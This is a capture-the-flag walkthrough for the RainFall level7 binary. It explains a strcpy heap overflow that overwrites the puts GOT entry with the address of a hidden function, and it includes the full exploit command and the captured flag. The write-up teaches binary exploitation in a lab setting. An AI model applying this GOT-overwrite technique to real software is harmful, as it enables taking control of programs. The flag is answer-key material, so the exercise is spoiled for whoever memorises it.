# Walkthrough

## Solution

```
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1666004181
 ```

## Explanation

### Execution

```
level7@RainFall:~$ ./level7 
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 hello
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 hello hello
~~
```  
-> The program takes 2 arguments and prints "~~"

### Disassembly

```
info var:
0x08049960  c

info function
0x080484f4  m
0x08048521  main
```

You can view the commented asm code [here](Ressources/assembly.asm)  
You can view the asm code translated to C [here](source.c)  

### Steps

The main stores the .pass file in the c variable, but doesn't print it.  
-> We need to call the m function that is not called, but that prints the c variable.  

Let's try to call the m function instead of the puts function.  

Address of m: 0x080484f4  
Address of puts in the GOT, as the address in the PLT is read-only: 0x08049928  
```
level7@RainFall:~$ objdump -R ./level7
./level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049928 R_386_JUMP_SLOT   puts
```

-> we need to replace the address of puts by the address of m.
`
man strcy:
 If the destination string of a strcpy() is not large enough, then anything might happen.  Overflowing fixed-length string buffers is a favorite cracker technique for taking complete control of the machine.
`

-> We can overflow with strcpy.

- Find the overflow offset:
```
level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
__libc_start_main(0x8048521, 2, 0xbffff794, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                = 0x0804a008
malloc(8)                                                = 0x0804a018
malloc(8)                                                = 0x0804a028
malloc(8)                                                = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...> --> 20 in the Buffer Overflow pattern generator
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```  
--> offset is at 20  

- Build the command
`
./level7 arg1 arg2
arg1 = x padding to overflow into 3rd malloc, and replace ptr2[1] with address of puts
arg2 = address of m
`
-> so that we have strcpy(dest: &puts, src: &m), so when we call puts("~~"), we will call m in reality.

- Final Command
```
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1666004181
```